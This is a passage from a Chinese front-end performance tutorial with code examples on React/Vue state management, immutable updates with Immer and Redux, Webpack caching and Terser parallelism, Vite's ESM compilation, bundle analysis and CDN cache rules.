class="hljs-string">&#x27;light&#x27;</span> &#125;),<br>  <span class="hljs-attr">actions</span>: &#123;<br>    <span class="hljs-title function_">setTheme</span>(<span class="hljs-params">newTheme</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">theme</span> = newTheme;<br>    &#125;<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// 组件中使用</span><br><span class="hljs-keyword">import</span> &#123; storeToRefs &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;pinia&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; useUserStore &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/stores/user&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-title function_">setup</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>();<br>    <span class="hljs-comment">// 精准解构响应式状态</span><br>    <span class="hljs-keyword">const</span> &#123; theme &#125; = <span class="hljs-title function_">storeToRefs</span>(userStore);<br>    <span class="hljs-keyword">return</span> &#123; theme &#125;;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>性能陷阱</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// 错误做法：大状态对象导致全量更新</span><br>&lt;<span class="hljs-title class_">AppContext</span>.<span class="hljs-property">Provider</span> value=&#123;&#123; user, theme, cart, ... &#125;&#125;&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ComponentA</span> /&gt;</span></span>  <span class="hljs-comment">// 任何状态变化都重渲染</span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ComponentB</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">AppContext</span>.<span class="hljs-property">Provider</span>&gt;<br><br><span class="hljs-comment">// 正确方案：拆分Context</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;user&#125;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">CartContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;cart&#125;</span>&gt;</span></span><br><span class="language-xml">      ...</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">CartContext.Provider</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>最佳实践原则</strong></p><p>(1) 最小范围原则：</p><pre class="mermaid">graph LR  A[状态创建] --> B{影响范围}  B -->|组件内| C[useState/ref]  B -->|父子组件| D[Props/emit]  B -->|跨组件| E[Context/Pinia]</pre><p>(2) 读写分离原则：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 分离状态读取和更新Context</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeUpdateContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useTheme</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useThemeUpdate</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeUpdateContext</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) 原子化设计：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// 使用状态管理库（如Jotai）</span><br><span class="hljs-keyword">const</span> themeAtom = <span class="hljs-title function_">atom</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemeSwitcher</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useAtom</span>(themeAtom);<br>  <span class="hljs-comment">// 仅订阅theme的组件更新</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>框架推荐方案</strong></p><table><thead><tr><th align="left">框架</th><th align="left">局部状态</th><th align="left">组件间共享</th><th align="left">全局状态</th></tr></thead><tbody><tr><td align="left">React</td><td align="left">useState</td><td align="left">Props + 状态提升</td><td align="left">Context&#x2F;Recoil&#x2F;Jotai</td></tr><tr><td align="left">Vue</td><td align="left">ref&#x2F;reactive</td><td align="left">Props&#x2F;emit</td><td align="left">Pinia&#x2F;Provide-Inject</td></tr><tr><td align="left">Angular</td><td align="left">Component State</td><td align="left">@Input&#x2F;@Output</td><td align="left">NgRx&#x2F;Service + RxJS</td></tr></tbody></table><blockquote><p>黄金法则：当状态更新导致超过3个无关组件重渲染时，应重新评估状态位置</p></blockquote><h3 id="Immutable-Data-减少重复渲染"><a href="#Immutable-Data-减少重复渲染" class="headerlink" title="Immutable Data 减少重复渲染"></a>Immutable Data 减少重复渲染</h3><p><strong>核心问题：可变数据导致的无效渲染</strong></p><pre class="mermaid">graph LR  A[状态更新] --> B{使用可变数据}  B -->|直接修改对象/数组| C[引用地址不变]  C --> D[浅比较无法检测变化]  D --> E[组件不更新或过度更新]</pre><p><strong>Immutable Data 解决方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 可变数据（问题）</span><br><span class="hljs-keyword">const</span> user = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> &#125;;<br>user.<span class="hljs-property">age</span> = <span class="hljs-number">31</span>; <span class="hljs-comment">// 修改后引用地址不变</span><br><br><span class="hljs-comment">// 不可变数据（解决方案）</span><br><span class="hljs-keyword">const</span> updatedUser = &#123; ...user, <span class="hljs-attr">age</span>: <span class="hljs-number">31</span> &#125;; <span class="hljs-comment">// 创建新引用</span><br></code></pre></td></tr></table></figure><p><strong>三大核心优势</strong></p><ul><li>精准变更检测：引用变化即表示数据变化</li><li>渲染优化：避免深度比较的性能损耗</li><li>状态可预测：消除隐式副作用</li></ul><p><strong>React 实现方案</strong></p><p>(1) 基础不可变操作</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// 对象更新</span><br><span class="hljs-keyword">const</span> newState = &#123; ...oldState, <span class="hljs-attr">profile</span>: updatedProfile &#125;;<br><br><span class="hljs-comment">// 数组更新</span><br><span class="hljs-keyword">const</span> newList = [<br>  ...oldList.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, index),<br>  updatedItem,<br>  ...oldList.<span class="hljs-title function_">slice</span>(index + <span class="hljs-number">1</span>)<br>];<br><br><span class="hljs-comment">// 嵌套结构更新</span><br><span class="hljs-keyword">const</span> newData = &#123;<br>  ...oldData,<br>  <span class="hljs-attr">user</span>: &#123;<br>    ...oldData.<span class="hljs-property">user</span>,<br>    <span class="hljs-attr">address</span>: &#123;<br>      ...oldData.<span class="hljs-property">user</span>.<span class="hljs-property">address</span>,<br>      <span class="hljs-attr">city</span>: <span class="hljs-string">&#x27;New York&#x27;</span><br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) 使用 Immer 简化</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> produce <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;immer&#x27;</span>;<br><br><span class="hljs-keyword">const</span> nextState = <span class="hljs-title function_">produce</span>(currentState, <span class="hljs-function"><span class="hljs-params">draft</span> =&gt;</span> &#123;<br>  draft.<span class="hljs-property">user</span>.<span class="hljs-property">age</span> = <span class="hljs-number">31</span>;<br>  draft.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(&#123; <span class="hljs-attr">id</span>: <span class="hljs-number">100</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;New Post&#x27;</span> &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>(3) Redux 最佳实践</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">todoReducer</span>(<span class="hljs-params">state = initialState, action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;TOGGLE_TODO&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<br>        ...state,<br>        <span class="hljs-attr">todos</span>: state.<span class="hljs-property">todos</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span><br>          todo.<span class="hljs-property">id</span> === action.<span class="hljs-property">id</span> ? &#123; ...todo, <span class="hljs-attr">completed</span>: !todo.<span class="hljs-property">completed</span> &#125; : todo<br>        )<br>      &#125;;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Vue 实现方案</strong></p><p>(1) 组合式 API 优化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;script setup&gt;<br>import &#123; reactive &#125; from &#x27;vue&#x27;;<br><br>// 使用不可变更新<br>const state = reactive(&#123; items: [] &#125;);<br><br>function addItem(newItem) &#123;<br>  state.items = [...state.items, newItem]; // 创建新数组<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>(2) Pinia 不可变模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// store</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCart = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">&#x27;cart&#x27;</span>, &#123;<br>  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> (&#123; <span class="hljs-attr">items</span>: [] &#125;),<br>  <span class="hljs-attr">actions</span>: &#123;<br>    <span class="hljs-title function_">addItem</span>(<span class="hljs-params">product</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span> = [...<span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>, product]; <span class="hljs-comment">// 不可变更新</span><br>    &#125;<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>性能优化原理</strong></p><pre class="mermaid">graph TD  A[状态变更] --> B{是否使用不可变数据}  B -->|是| C[创建新引用]  C --> D[浅比较即可检测变化]  D --> E[精准更新相关组件]    B -->|否| F[修改原对象]  F --> G[引用未变但内容变化]  G --> H[需要深度比较检测变化]  H --> I[性能损耗+可能漏更新]</pre><p><strong>与可变数据对比</strong></p><table><thead><tr><th align="left">维度</th><th align="left">可变数据 (Mutable)</th><th align="left">不可变数据 (Immutable)</th></tr></thead><tbody><tr><td align="left">检测方式</td><td align="left">深度比较</td><td align="left">浅比较</td></tr><tr><td align="left">更新性能</td><td align="left">快(修改)慢(比较)</td><td align="left">慢(创建)快(比较)</td></tr><tr><td align="left">内存使用</td><td align="left">低</td><td align="left">高(需垃圾回收)</td></tr><tr><td align="left">代码复杂度</td><td align="left">简单(直接修改)</td><td align="left">复杂(需创建副本)</td></tr><tr><td align="left">调试难度</td><td align="left">难(状态历史丢失)</td><td align="left">易(完整状态快照)</td></tr><tr><td align="left">并发安全</td><td align="left">不安全</td><td align="left">安全</td></tr></tbody></table><h1 id="五、工程化基建优化"><a href="#五、工程化基建优化" class="headerlink" title="五、工程化基建优化"></a>五、工程化基建优化</h1><h2 id="5-1-构建工具优化"><a href="#5-1-构建工具优化" class="headerlink" title="5.1 构建工具优化"></a>5.1 构建工具优化</h2><h3 id="Webpack：持久化缓存、并行压缩（Terser多进程）"><a href="#Webpack：持久化缓存、并行压缩（Terser多进程）" class="headerlink" title="Webpack：持久化缓存、并行压缩（Terser多进程）"></a>Webpack：持久化缓存、并行压缩（Terser多进程）</h3><p><strong>持久化缓存 (Persistent Caching)</strong></p><p>解决的问题：</p><ul><li>Webpack 每次构建默认会重新处理所有模块（解析、加载、转换），导致重复构建开销，尤其影响大型项目的开发迭代和 CI&#x2F;CD 效率。</li></ul><p>核心机制（Webpack 5+）：</p><p>(1) 缓存存储：</p><ul><li>将模块构建结果（AST、转换后代码、依赖关系等）序列化存储到本地文件系统（默认路径：node_modules&#x2F;.cache&#x2F;webpack）</li><li>配置示例：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">cache</span>: &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;filesystem&#x27;</span>,  <span class="hljs-comment">// 启用文件系统缓存</span><br>    <span class="hljs-attr">cacheDirectory</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;.temp_cache&#x27;</span>), <span class="hljs-comment">// 自定义缓存目录</span><br>    <span class="hljs-attr">buildDependencies</span>: &#123;<br>      <span class="hljs-attr">config</span>: [__filename],  <span class="hljs-comment">// 配置文件变更时使缓存失效</span><br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) 增量构建：</p><ul><li>二次构建时仅处理变更文件及其依赖链</li><li>未变更模块直接从缓存读取，跳过解析&#x2F;转换流程</li></ul><p>(3) 智能失效：</p><ul><li>自动追踪配置、loader、依赖包版本等关键因素</li><li>相关变更时自动失效对应缓存</li></ul><p><strong>并行压缩 (Parallel Compression with Terser)</strong></p><p>解决的问题：</p><ul><li>JavaScript 压缩（混淆&#x2F;优化）是构建中最耗 CPU 的阶段</li><li>默认单线程压缩无法利用多核 CPU 优势</li></ul><p>实现原理：</p><ul><li>多进程并行：<ul><li>通过 TerserPlugin 的 parallel 选项启用</li><li>创建多个 Worker 进程（默认数量：CPU 核心数 -1）</li><li>将不同 chunk 分配给 Worker 并行压缩</li></ul></li><li>生产环境配置：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">TerserPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;terser-webpack-plugin&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-attr">minimizer</span>: [<br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">TerserPlugin</span>(&#123;<br>        <span class="hljs-attr">parallel</span>: <span class="hljs-literal">true</span>,  <span class="hljs-comment">// 启用多进程压缩</span><br>        <span class="hljs-attr">terserOptions</span>: &#123;<br>          <span class="hljs-attr">compress</span>: &#123; <span class="hljs-attr">drop_console</span>: <span class="hljs-literal">true</span> &#125;  <span class="hljs-comment">// 压缩配置</span><br>        &#125;<br>      &#125;)<br>    ]<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="Vite：基于ESM的按需编译"><a href="#Vite：基于ESM的按需编译" class="headerlink" title="Vite：基于ESM的按需编译"></a>Vite：基于ESM的按需编译</h3><p><strong>核心原理：ESM 原生支持</strong></p><p>(1) 传统打包器问题（如 Webpack）：</p><ul><li>启动慢：需先打包整个应用才能启动服务</li><li>热更新慢：文件修改后需重新构建整个 bundle</li><li>按需加载局限：仅支持路由级代码分割</li></ul><p>(2) Vite 的突破：</p><ul><li>利用浏览器原生支持 ES 模块 (ESM)：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 浏览器直接解析 ESM --&gt;<br>&lt;script type=&quot;module&quot; src=&quot;/src/main.js&quot;&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><ul><li>按需编译：<ul><li>启动时只编译轻量级依赖（预构建）</li><li>业务代码按需转换（访问时编译）</li></ul></li></ul><p><strong>工作流程</strong></p><pre class="mermaid">graph LR    A[浏览器请求] --> B[Vite 服务器]    B --> C{路由请求?}    C -->|是| D[返回 HTML 模板]    C -->|否| E{文件类型}    E -->|JS/TS| F[按需编译为 ESM]    E -->|CSS| G[编译为 CSS 变量注入]    E -->|Vue/JSX| H[即时编译为 JS]    F & G & H --> I[返回浏览器执行]</pre><p><strong>关键技术实现</strong></p><p>(1) 依赖预构建：</p><ul><li>目标：将 CommonJS 模块转换为 ESM，合并零散文件</li><li>工具：esbuild（Go 语言编写，比 JS 工具快 10-100 倍）</li><li>结果：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 转换前（node_modules）</span><br><span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br><span class="hljs-comment">// 转换后（预构建）</span><br><span class="hljs-keyword">import</span> lodash <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/node_modules/.vite/lodash.js&#x27;</span>;<br></code></pre></td></tr></table></figure><p>(2) 按需编译</p><ul><li>请求拦截：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Vite 中间件伪代码</span><br>server.<span class="hljs-property">middlewares</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">url</span>.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">&#x27;.vue&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">const</span> code = <span class="hljs-title function_">compileVue</span>(req.<span class="hljs-property">url</span>); <span class="hljs-comment">// 即时编译</span><br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-title function_">transformToESM</span>(code));<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><ul><li>编译时机：浏览器发起请求时才编译对应文件</li></ul><p>(3) HMR 热更新：</p><ul><li>传统方案：重建整个 bundle</li><li>Vite 方案：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 建立 WebSocket 连接</span><br><span class="hljs-keyword">const</span> socket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&#x27;ws://localhost:3000&#x27;</span>);<br><br><span class="hljs-comment">// 文件修改时</span><br>socket.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">&#123; data &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;update&#x27;</span>) &#123;<br>    <span class="hljs-comment">// 只重新请求单个模块</span><br>    <span class="hljs-keyword">import</span>(<span class="hljs-string">`/src/<span class="hljs-subst">$&#123;data.filePath&#125;</span>?t=<span class="hljs-subst">$&#123;<span class="hljs-built_in">Date</span>.now()&#125;</span>`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>适用场景</strong></p><ul><li>优势场景：<ul><li>现代浏览器项目（需支持 ESM）</li><li>大型 Monorepo 项目</li><li>频繁热更新的开发环境</li></ul></li><li>限制：<ul><li>不支持 IE11 等旧浏览器（需插件 @vitejs&#x2F;plugin-legacy）</li><li>深度定制构建需学习 Rollup API</li></ul></li></ul><h3 id="Bundle-分析工具：Webpack-bundle-analyzer"><a href="#Bundle-分析工具：Webpack-bundle-analyzer" class="headerlink" title="Bundle 分析工具：Webpack-bundle-analyzer"></a>Bundle 分析工具：Webpack-bundle-analyzer</h3><p><strong>核心功能</strong></p><p>(1) 可视化分析：</p><ul><li>生成交互式树状图（Treemap）展示所有输出文件</li><li>按模块&#x2F;包(package)展示物理体积（gzip前）和占比</li></ul><pre class="mermaid">graph TD  A[入口文件] --> B[react-dom]  A --> C[lodash-es]  A --> D[业务组件]  D --> D1[Header.jsx]  D --> D2[ProductList.ts]</pre><p>(2) 关键洞察维度：</p><ul><li>模块体积排名（找出最大模块）</li><li>重复依赖检测（同一包被多次打包）</li><li>代码分割效果验证</li><li>第三方依赖（node_modules）占比</li></ul><p><strong>工作原理</strong></p><pre class="mermaid">sequenceDiagram  participant Webpack  participant Plugin  participant Browser    Webpack->>Plugin: 构建完成后触发钩子  Plugin->>Plugin: 收集stats.json数据  Plugin->>Plugin: 生成分析报告HTML  Plugin->>Browser: 自动打开127.0.0.1:8888  Browser->>Plugin: 请求报告数据  Plugin->>Browser: 返回交互式可视化页面</pre><p><strong>配置示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack-bundle-analyzer&#x27;</span>)<br> .<span class="hljs-property">BundleAnalyzerPlugin</span>;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span>(&#123;<br>      <span class="hljs-attr">analyzerMode</span>: <span class="hljs-string">&#x27;server&#x27;</span>, <span class="hljs-comment">// 启动本地服务查看</span><br>      <span class="hljs-attr">openAnalyzer</span>: <span class="hljs-literal">true</span>,     <span class="hljs-comment">// 构建完成后自动打开</span><br>      <span class="hljs-attr">reportFilename</span>: <span class="hljs-string">&#x27;report.html&#x27;</span> <span class="hljs-comment">// 自定义报告文件名</span><br>    &#125;)<br>  ]<br>&#125;;<br><br><span class="hljs-comment">// 高级参数</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span>(&#123;<br>  <span class="hljs-attr">analyzerPort</span>: <span class="hljs-number">3000</span>,              <span class="hljs-comment">// 自定义端口</span><br>  <span class="hljs-attr">defaultSizes</span>: <span class="hljs-string">&#x27;parsed&#x27;</span>,          <span class="hljs-comment">// 显示解析后大小</span><br>  <span class="hljs-attr">excludeAssets</span>: <span class="hljs-regexp">/\.map$/</span>,         <span class="hljs-comment">// 排除sourcemap</span><br>  <span class="hljs-attr">statsOptions</span>: &#123;<br>    <span class="hljs-attr">excludeModules</span>: <span class="hljs-regexp">/node_modules\/core-js/</span> <span class="hljs-comment">// 排除特定模块</span><br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p><strong>分析报告解读 - 关键区域说明</strong></p><table><thead><tr><th align="left">区域</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">矩形大小</td><td align="left">模块物理体积（非gzip）</td></tr><tr><td align="left">颜色深度</td><td align="left">文件数量（越深文件越多）</td></tr><tr><td align="left">悬停提示</td><td align="left">显示精确大小和路径</td></tr><tr><td align="left">左上角筛选器</td><td align="left">按入口&#x2F;文件类型过滤</td></tr></tbody></table><h2 id="5-2-CDN与边缘计算"><a href="#5-2-CDN与边缘计算" class="headerlink" title="5.2 CDN与边缘计算"></a>5.2 CDN与边缘计算</h2><h3 id="边缘缓存策略（CDN-Cache-Rules）"><a href="#边缘缓存策略（CDN-Cache-Rules）" class="headerlink" title="边缘缓存策略（CDN Cache Rules）"></a>边缘缓存策略（CDN Cache Rules）</h3><p><strong>核心概念与价值</strong></p><p>(1) CDN 边缘节点：</p><ul><li>全球分布的服务器节点（通常1000+）</li><li>物理位置靠近终端用户</li><li>示例拓扑：</li></ul><pre class="mermaid">graph LR  User[北京用户] --> |10ms| BJ[北京CDN节点]  User --> |150ms| NY[纽约源站]  BJ --> |40ms| SH[上海源站]</pre><p>(2) 缓存策略目标：</p><ul><li>加速内容分发（降低延迟）</li><li>减少源站带宽成本</li><li>缓解源站压力（防DDoS）</li></ul><p><strong>缓存规则核心配置维度</strong></p><table><thead><tr><th align="left">配置维度</th><th align="left">关键参数</th><th align="left">典型值示例</th><th align="left">作用说明</th></tr></thead><tbody><tr><td align="left">缓存键</td><td align="left">Cache-Key</td><td align="left">$uri-$query-$cookie</td><td align="left">定义资源唯一标识</td></tr><tr><td align="left">缓存时间</td><td align="left">Cache-Control: max-age</td><td align="left">max-age&#x3D;31536000</td><td align="left">静态资源设置1年缓存</td></tr><tr><td align="left">缓存层级</td><td align="left">CDN-Cache-Level</td><td align="left">L1&#x2F;L2</td><td align="left">控制边缘&#x2F;中间层缓存</td></tr><tr><td align="left">缓存行为</td><td align="left">X-Cache</td><td align="left">HIT&#x2F;MISS&#x2F;BYPASS</td><td align="left">显示缓存命中状态</td></tr><tr><td align="left">缓存清除</td><td align="left">Purge-API</td><td align="left">POST &#x2F;purge&#x2F;{url}</td><td 